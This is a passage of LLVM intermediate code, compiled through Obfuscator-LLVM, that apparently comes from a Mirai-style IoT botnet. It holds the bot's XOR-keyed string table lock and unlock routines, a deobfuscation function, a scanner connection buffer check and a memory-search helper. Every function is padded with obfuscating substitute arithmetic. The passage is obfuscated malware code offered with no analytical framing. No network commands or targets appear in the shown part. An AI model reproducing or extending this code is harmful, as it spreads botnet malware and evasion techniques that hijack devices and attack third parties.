  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = sub i32 %11, 1578882427
  %13 = add i32 %12, 1
  %14 = add i32 %13, 1578882427
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = call noalias i8* @malloc(i64 %16) #6
  store i8* %17, i8** %6, align 8
  %18 = load i8*, i8** %6, align 8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32*, i32** %4, align 8
  %21 = load i32, i32* %20, align 4
  %22 = sub i32 0, 1
  %23 = sub i32 %21, %22
  %24 = add nsw i32 %21, 1
  call void @util_memcpy(i8* %18, i8* %19, i32 %23)
  store i32 0, i32* %5, align 4
  br label %25

; <label>:25:                                     ; preds = %93, %2
  %26 = load i32, i32* %5, align 4
  %27 = load i32*, i32** %4, align 8
  %28 = load i32, i32* %27, align 4
  %29 = icmp slt i32 %26, %28
  br i1 %29, label %30, label %99

; <label>:30:                                     ; preds = %25
  %31 = load i8*, i8** %6, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = load i8, i8* %34, align 1
  %36 = sext i8 %35 to i32
  %37 = xor i32 %36, -1
  %38 = and i32 -1374547335, %37
  %39 = xor i32 -1374547335, -1
  %40 = and i32 %36, %39
  %41 = xor i32 222, -1
  %42 = and i32 %41, -1374547335
  %43 = and i32 222, %39
  %44 = or i32 %38, %40
  %45 = or i32 %42, %43
  %46 = xor i32 %44, %45
  %47 = xor i32 %36, 222
  %48 = trunc i32 %46 to i8
  store i8 %48, i8* %34, align 1
  %49 = load i8*, i8** %6, align 8
  %50 = load i32, i32* %5, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %49, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = sext i8 %53 to i32
  %55 = xor i32 %54, -1
  %56 = and i32 222, %55
  %57 = xor i32 222, -1
  %58 = and i32 %54, %57
  %59 = or i32 %56, %58
  %60 = xor i32 %54, 222
  %61 = trunc i32 %59 to i8
  store i8 %61, i8* %52, align 1
  %62 = load i8*, i8** %6, align 8
  %63 = load i32, i32* %5, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %62, i64 %64
  %66 = load i8, i8* %65, align 1
  %67 = sext i8 %66 to i32
  %68 = xor i32 %67, -1
  %69 = and i32 -859410081, %68
  %70 = xor i32 -859410081, -1
  %71 = and i32 %67, %70
  %72 = xor i32 251, -1
  %73 = and i32 %72, -859410081
  %74 = and i32 251, %70
  %75 = or i32 %69, %71
  %76 = or i32 %73, %74
  %77 = xor i32 %75, %76
  %78 = xor i32 %67, 251
  %79 = trunc i32 %77 to i8
  store i8 %79, i8* %65, align 1
  %80 = load i8*, i8** %6, align 8
  %81 = load i32, i32* %5, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  %84 = load i8, i8* %83, align 1
  %85 = sext i8 %84 to i32
  %86 = xor i32 %85, -1
  %87 = and i32 175, %86
  %88 = xor i32 175, -1
  %89 = and i32 %85, %88
  %90 = or i32 %87, %89
  %91 = xor i32 %85, 175
  %92 = trunc i32 %90 to i8
  store i8 %92, i8* %83, align 1
  br label %93

; <label>:93:                                     ; preds = %30
  %94 = load i32, i32* %5, align 4
  %95 = add i32 %94, -231973055
  %96 = add i32 %95, 1
  %97 = sub i32 %96, -231973055
  %98 = add nsw i32 %94, 1
  store i32 %97, i32* %5, align 4
  br label %25

; <label>:99:                                     ; preds = %25
  %100 = load i8*, i8** %6, align 8
  ret i8* %100
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 1172394753, -1
  %16 = or i32 %13, %14
  %17 = or i32 1172394753, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 %23, -1
  %25 = xor i32 255, -1
  %26 = xor i32 -1712398322, -1
  %27 = or i32 %24, %25
  %28 = or i32 -1712398322, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %23, 255
  %32 = trunc i32 %30 to i8
  store i8 %32, i8* %6, align 1
  %33 = load i32, i32* @table_key, align 4
  %34 = lshr i32 %33, 16
  %35 = xor i32 %34, -1
  %36 = xor i32 255, -1
  %37 = xor i32 -1111357999, -1
  %38 = or i32 %35, %36
  %39 = or i32 -1111357999, %37
  %40 = xor i32 %38, -1
  %41 = and i32 %40, %39
  %42 = and i32 %34, 255
  %43 = trunc i32 %41 to i8
  store i8 %43, i8* %7, align 1
  %44 = load i32, i32* @table_key, align 4
  %45 = lshr i32 %44, 24
  %46 = xor i32 255, -1
  %47 = xor i32 %45, %46
  %48 = and i32 %47, %45
  %49 = and i32 %45, 255
  %50 = trunc i32 %48 to i8
  store i8 %50, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %137, %1
  %52 = load i32, i32* %3, align 4
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 1
  %55 = load i16, i16* %54, align 8
  %56 = zext i16 %55 to i32
  %57 = icmp slt i32 %52, %56
  br i1 %57, label %58, label %142

; <label>:58:                                     ; preds = %51
  %59 = load i8, i8* %5, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, -1
  %70 = and i32 -1498792814, %69
  %71 = xor i32 -1498792814, -1
  %72 = and i32 %68, %71
  %73 = xor i32 %60, -1
  %74 = and i32 %73, -1498792814
  %75 = and i32 %60, %71
  %76 = or i32 %70, %72
  %77 = or i32 %74, %75
  %78 = xor i32 %76, %77
  %79 = xor i32 %68, %60
  %80 = trunc i32 %78 to i8
  store i8 %80, i8* %66, align 1
  %81 = load i8, i8* %6, align 1
  %82 = zext i8 %81 to i32
  %83 = load %struct.table_value*, %struct.table_value** %4, align 8
  %84 = getelementptr inbounds %struct.table_value, %struct.table_value* %83, i32 0, i32 0
  %85 = load i8*, i8** %84, align 8
  %86 = load i32, i32* %3, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = sext i8 %89 to i32
  %91 = xor i32 %90, -1
  %92 = and i32 %82, %91
  %93 = xor i32 %82, -1
  %94 = and i32 %90, %93
  %95 = or i32 %92, %94
  %96 = xor i32 %90, %82
  %97 = trunc i32 %95 to i8
  store i8 %97, i8* %88, align 1
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = load %struct.table_value*, %struct.table_value** %4, align 8
  %101 = getelementptr inbounds %struct.table_value, %struct.table_value* %100, i32 0, i32 0
  %102 = load i8*, i8** %101, align 8
  %103 = load i32, i32* %3, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i8, i8* %102, i64 %104
  %106 = load i8, i8* %105, align 1
  %107 = sext i8 %106 to i32
  %108 = xor i32 %107, -1
  %109 = and i32 %99, %108
  %110 = xor i32 %99, -1
  %111 = and i32 %107, %110
  %112 = or i32 %109, %111
  %113 = xor i32 %107, %99
  %114 = trunc i32 %112 to i8
  store i8 %114, i8* %105, align 1
  %115 = load i8, i8* %8, align 1
  %116 = zext i8 %115 to i32
  %117 = load %struct.table_value*, %struct.table_value** %4, align 8
  %118 = getelementptr inbounds %struct.table_value, %struct.table_value* %117, i32 0, i32 0
  %119 = load i8*, i8** %118, align 8
  %120 = load i32, i32* %3, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = sext i8 %123 to i32
  %125 = xor i32 %124, -1
  %126 = and i32 815750212, %125
  %127 = xor i32 815750212, -1
  %128 = and i32 %124, %127
  %129 = xor i32 %116, -1
  %130 = and i32 %129, 815750212
  %131 = and i32 %116, %127
  %132 = or i32 %126, %128
  %133 = or i32 %130, %131
  %134 = xor i32 %132, %133
  %135 = xor i32 %124, %116
  %136 = trunc i32 %134 to i8
  store i8 %136, i8* %122, align 1
  br label %137

; <label>:137:                                    ; preds = %58
  %138 = load i32, i32* %3, align 4
  %139 = sub i32 0, 1
  %140 = sub i32 %138, %139
  %141 = add nsw i32 %138, 1
  store i32 %140, i32* %3, align 4
  br label %51

; <label>:142:                                    ; preds = %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %52, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %59

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %50

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add i32 %36, 1574654254
  %38 = add i32 %37, 1
  %39 = sub i32 %38, 1574654254
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = add i32 %44, -388732632
  %46 = add i32 %45, 1
  %47 = sub i32 %46, -388732632
  %48 = add nsw i32 %44, 1
  store i32 %47, i32* %5, align 4
  br label %60

; <label>:49:                                     ; preds = %35
  br label %51

; <label>:50:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  br label %52

; <label>:52:                                     ; preds = %51
  %53 = load i32, i32* %10, align 4
  %54 = sub i32 0, %53
  %55 = sub i32 0, 1
  %56 = add i32 %54, %55
  %57 = sub i32 0, %56
  %58 = add nsw i32 %53, 1
  store i32 %57, i32* %10, align 4
  br label %17

; <label>:59:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %60

; <label>:60:                                     ; preds = %59, %43, %15
  %61 = load i32, i32* %5, align 4
  ret i32 %61
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146817152}
!2 = !{i32 -2146816743}
